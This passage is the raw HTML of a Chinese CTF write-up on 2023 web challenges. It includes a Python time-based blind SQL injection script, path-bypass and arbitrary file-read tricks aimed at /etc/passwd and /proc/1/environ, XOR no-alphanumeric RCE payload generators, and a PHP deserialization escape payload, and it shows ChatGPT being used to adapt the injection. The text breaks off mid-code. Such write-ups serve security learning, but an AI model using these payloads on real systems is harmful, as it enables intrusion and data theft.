information_schema.columns)a,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.columns)b,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.columns limit <span class="number">1</span>,<span class="number">7</span>)c) limit <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>当时因为懒 没深究这个  看别的题去了  导致没做出来。。。。。。。</p><p><strong>直接问gpt</strong></p><p><img src="../images/image-20230724104909369.png" alt="image-20230724104909369"></p><p><img src="../images/image-20230724105015874.png" alt="image-20230724105015874"></p><p><strong>直接让gpt来帮我们在原来的基础上进行修改</strong></p><p><img src="../images/image-20230724105451643.png" alt="image-20230724105451643"> </p><p><img src="../images/image-20230724105521195.png" alt="image-20230724105521195"></p><p>可以成功进行延时</p><p><strong>最终的脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">            burp0_url = <span class="string">&quot;http://web-c456af9c06.challenge.xctf.org.cn/index.php?id=1&#x27; and case when ((select ascii(&quot;</span> \</span><br><span class="line">                        <span class="string">&quot;substr(group_concat(table_name),&#123;&#125;,1)) from information_schema.tables where table_schema=database()))=&#123;&#125; then (select sum(1) FROM &quot;</span> \</span><br><span class="line">                        <span class="string">&quot;information_schema.tables A, information_schema.columns B, information_schema.tables C, &quot;</span> \</span><br><span class="line">                        <span class="string">&quot;information_schema.views D) else 1 end-- -&quot;</span>.<span class="built_in">format</span>(i, j)</span><br><span class="line">                <span class="comment">#Flllag</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># burp0_url = &quot;http://web-c456af9c06.challenge.xctf.org.cn/index.php?id=1&#x27; and case when ((select ascii(&quot; \</span></span><br><span class="line">            <span class="comment">#             &quot;substr(group_concat(column_name),&#123;&#125;,1)) from information_schema.columns where table_name=&#x27;Flllag&#x27;))=&#123;&#125; then (select sum(1) FROM &quot; \</span></span><br><span class="line">            <span class="comment">#             &quot;information_schema.tables A, information_schema.columns B, information_schema.tables C, &quot; \</span></span><br><span class="line">            <span class="comment">#             &quot;information_schema.views D) else 1 end-- -&quot;.format(i, j)</span></span><br><span class="line">                <span class="comment">#Flagg</span></span><br><span class="line">            <span class="comment"># burp0_url = &quot;http://web-c456af9c06.challenge.xctf.org.cn/index.php?id=1&#x27; and case when ((select ascii(&quot; \</span></span><br><span class="line">            <span class="comment">#             &quot;substr(group_concat(Flagg),&#123;&#125;,1)) from Flllag))=&#123;&#125; then (select sum(1) FROM &quot; \</span></span><br><span class="line">            <span class="comment">#             &quot;information_schema.tables A, information_schema.columns B, information_schema.tables C, &quot; \</span></span><br><span class="line">            <span class="comment">#             &quot;information_schema.views D) else 1 end-- -&quot;.format(i, j)</span></span><br><span class="line"></span><br><span class="line">            burp0_headers = &#123;<span class="string">&quot;Pragma&quot;</span>: <span class="string">&quot;no-cache&quot;</span>, <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;no-cache&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">                             <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">                             <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;</span>,</span><br><span class="line">                             <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">                             <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,zh-TW;q=0.8,en;q=0.7,en-US;q=0.6&quot;</span>,</span><br><span class="line">                             <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">            r = requests.get(burp0_url, headers=burp0_headers, timeout=<span class="number">3</span>)</span><br><span class="line">            <span class="comment"># time.sleep(1)</span></span><br><span class="line">            <span class="comment"># print(j,r.text)</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            res += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;kfrL9n0upSAOMvY8hcO8uLdYMo9mZjHY&#125;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230724110506033.png" alt="image-20230724110506033"></p><p>这里解释一下这个<code>case when condition then result</code>  的意思</p><p>就是当<strong>查询内容</strong>满足这个<code>condition</code>的时候就会返回<code>result</code> </p><p><strong>上述代码的意思就是说匹配到的时候就会延时</strong></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h3><ul><li>其实就是考察的是<strong>时间盲注</strong>  但是只是需要替换一些函数</li></ul><h2 id="hinder"><a href="#hinder" class="headerlink" title="hinder"></a>hinder</h2><p>这道题预期解其实是挺复杂的  但是这题存在非预期  (<strong>原因是出题人在运行完sh文件后没把该文件删除  导致出现了非预期)</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">题目提示了 </span><br><span class="line">访问/hinder</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230725111811018.png" alt="image-20230725111811018"></p><p>没访问之前是可以看到这个网站的服务器是<code>java</code>的    (<strong>是个挺重要的信息</strong>)</p><p><img src="../images/image-20230725112023678.png" alt="image-20230725112023678"></p><p>这里话是有两个绕过方法</p><ul><li>一个是url编码  (<strong>因为这里是前端校验</strong>)</li><li>另一个是使用    <code>/;/hinder</code></li><li><code>/anything/../hinder/</code> <strong>绕过路径 (这样也行)</strong></li></ul><p><img src="../images/image-20230725112140700.png" alt="image-20230725112140700"></p><p>这里的话讲一下这个  <code>/;/hinder</code>  绕过的原理</p><p><img src="../images/image-20230725112306230.png" alt="image-20230725112306230"></p><p><img src="../images/image-20230725112342291.png" alt="image-20230725112342291"></p><p>其实这里的话就是实现任意文件读取了   (<strong>看到这个<code>action</code>的时候其实可以想到这个<code>struct2</code></strong>)</p><p>尝试读取一下<code>/etc/passwd</code></p><p><img src="../images/image-20230725113456496.png" alt="image-20230725113456496"></p><h3 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a><strong>非预期解</strong></h3><p>尝试读取出题人常用的docker启动脚本   <strong>例如 <code>/run.sh  /start.sh</code></strong></p><p><img src="../images/1689930726240-f021d0b4-1312-46c6-8638-1a3398dd542f.png" alt="img"></p><p>然后读取该文件就行了 </p><p><img src="../images/1689930751274-96d92ed6-3259-4bcd-bdda-dc7be9aea343.png" alt="img"></p><p><strong>看到这些非预期解以后   以后读取文件的话可以尝试读取这两个地方的东西了</strong></p><ul><li><code>/proc/1/environ</code></li><li><code>/proc/1/cmdline</code></li><li><code>/run.sh  /start.sh 等等之类的docker启动常用脚本</code></li></ul><h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p><a href="https://www.yuque.com/dat0u/ctf/vl4hurp3yvqqsckz#BPCx1">巅峰极客2023 hinder</a></p><p>这个是使用的是<code>struct2</code>的漏洞来解的题</p><p>这里还没有一个完整的wp来看   所以先不写</p><h2 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize"></a><strong>unserialize</strong></h2><p><strong>启动脚本</strong></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="language-bash"> -it -d -p 12345:80 -e FLAG=flag&#123;8382843b-d3e8-72fc-6625-ba5269953b23&#125; lxxxin/dfjk2023_unserialize</span></span><br></pre></td></tr></table></figure><p>访问  <code>/www.zip</code>  得到源码</p><p><strong>function.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;aaaa&#x27;</span>, <span class="string">&#x27;bbbbbb&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;bbbbbb&#x27;</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>(<strong>这里的话大佬应该能猜到是反序列化逃逸</strong>)      反正我没猜到…………</p><p><strong>index.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;my.php&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;function.php&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;login.html&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;root&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pwd&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$root</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;root&#x27;</span>];</span><br><span class="line"><span class="variable">$pwd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pwd&#x27;</span>];</span><br><span class="line"><span class="variable">$login</span> = <span class="keyword">new</span> <span class="title function_ invoke__">push_it</span>(<span class="variable">$root</span>, <span class="variable">$pwd</span>);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] = <span class="title function_ invoke__">b</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$login</span>));</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;location.href=`./login.php`;&lt;/script&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>login.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;my.php&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;function.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;alert(`Login First!`);location.href=`./index.php`;&lt;/script&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$login</span> = @<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">a</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$login</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>my.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pull_it</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$x</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$xx</span></span>) </span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;x = <span class="variable">$xx</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;x) &#123;</span><br><span class="line"><span class="variable">$preg_match</span> = <span class="string">&#x27;return preg_match(&quot;/[A-Za-z0-9]+/i&quot;, $this-&gt;x);&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">eval</span>(<span class="variable">$preg_match</span>)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$preg_match</span>;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&quot;save_waf&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;x);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">push_it</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$root</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$pwd</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$root</span>, <span class="variable">$pwd</span></span>) </span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;root = <span class="variable">$root</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;pwd = <span class="variable">$pwd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;root);</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;pwd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;root) &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;pwd)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;Hello, <span class="subst">$this</span>-&gt;root&lt;/h1&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;out!&lt;/h1&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>开始代码审计</strong></p><p><img src="../images/image-20230724162222075.png" alt="image-20230724162222075"></p><p><strong>首先是在<code>index.php</code>处进行序列化操作 </strong>   <strong>然后在用b函数进行替换操作</strong></p><p><img src="../images/image-20230724162404370.png" alt="image-20230724162404370"></p><p><strong>最后是在这个<code>login.php</code>处先将序列化字符串进行a函数替换  然后再进行反序列化</strong></p><p><strong>命令执行是在这个地方</strong></p><p><img src="../images/image-20230724162637962.png" alt="image-20230724162637962"></p><p>就是在<code>my.php</code>这个里面  其实就是无数字字母RCE  但是这不是关键  关键是如何进行<strong>序列化字符串逃逸</strong></p><p><strong>先使用之前羽师傅写的一个异或脚本来生成自己想要执行的命令</strong></p><p><strong>xor.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&#x27;/[a-z0-9]/i&#x27;</span>; <span class="comment">//根据题目给的正则表达式修改即可</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line"><span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>xor.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># author yu22x</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;xor_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;^\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">   <span class="built_in">print</span>(param)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>使用方法就是先使用php生成字典  然后再使用python来生成自己想要的命令</strong></p><p><img src="../images/image-20230724163944186.png" alt="image-20230724163944186"></p><p>然后开始构造链子</p><p><img src="../images/image-20230724164349115.png" alt="image-20230724164349115"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">7</span>:<span class="string">&quot;pull_it&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot;pull_itx&quot;</span>;s:<span class="number">41</span>:<span class="string">&quot;(&quot;</span> <span class="string">&quot;^&quot;</span>&#123;&#123;&#123;|``<span class="string">&quot;)(&quot;</span><span class="string">&quot;^&quot;</span>``| /`*<span class="string">&quot;);&quot;</span>;&#125;</span><br><span class="line"><span class="comment">//没编码前</span></span><br><span class="line">O%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>pull_it%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>pull_it%<span class="number">00</span>x%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A41%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">28</span>%<span class="number">22</span>%<span class="number">08</span>%<span class="number">02</span>%<span class="number">08</span>%<span class="number">08</span>%<span class="number">05</span>%<span class="number">0</span>D%<span class="number">22</span>%<span class="number">5</span>E%<span class="number">22</span>%<span class="number">7</span>B%<span class="number">7</span>B%<span class="number">7</span>B%<span class="number">7</span>C%<span class="number">60</span>%<span class="number">60</span>%<span class="number">22</span>%<span class="number">29</span>%<span class="number">28</span>%<span class="number">22</span>%<span class="number">03</span>%<span class="number">01</span>%<span class="number">08</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">06</span>%<span class="number">00</span>%<span class="number">22</span>%<span class="number">5</span>E%<span class="number">22</span>%<span class="number">60</span>%<span class="number">60</span>%<span class="number">7</span>C+%<span class="number">2</span>F%<span class="number">60</span>%<span class="number">2</span>A%<span class="number">22</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D</span><br><span class="line"><span class="comment">//编码后                                                 </span></span><br></pre></td></tr></table></figure><p><strong>因为这里的是因为不能传入这个<code>pull_it</code>这个类直接进行反序列化</strong></p><p><img src="../images/image-20230724190117444.png" alt="image-20230724190117444"></p><p><strong>所以说我们就得尝试进行字符逃逸  把这个序列化后的结果加进去</strong></p><p>开始逃逸</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 